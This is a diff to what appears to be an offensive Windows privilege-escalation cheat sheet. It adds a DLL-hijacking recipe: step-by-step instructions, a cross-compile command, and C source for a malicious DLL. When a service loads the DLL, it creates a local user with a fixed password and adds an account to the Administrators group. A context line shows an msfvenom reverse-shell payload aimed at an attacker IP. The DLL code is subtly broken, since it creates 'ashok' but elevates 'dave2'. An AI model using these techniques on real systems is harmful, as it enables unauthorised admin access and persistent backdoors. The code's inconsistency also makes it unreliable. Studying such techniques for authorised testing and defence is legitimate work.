@@ -1312,6 +1312,44 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-po
 3. Copy it to victom machine and them move it to the service associated directory.(Make sure the dll name is similar to missing name)
 4. Start listener and restart service, you'll get a shell.
 
+### DLL Hijacking adding New user into Administrators group
+1. Create DLL with name file.cpp
+2. Convert file to .cpp to .dll, executable DLL using "x86_64-w64-mingw32-gcc".
+3. Place DLL on the target, with same name as missing (My case - BetaService)
+4. restart or start the service
+5. Check net user command, new user will be added.
+   
+```bash
+x86_64-w64-mingw32-gcc file.cpp --shared -o file.dll
+```
+
+```bash
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user ashok password123! /add");
+  	    i = system ("net localgroup administrators dave2 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
 ## Autorun
 
 ```powershell
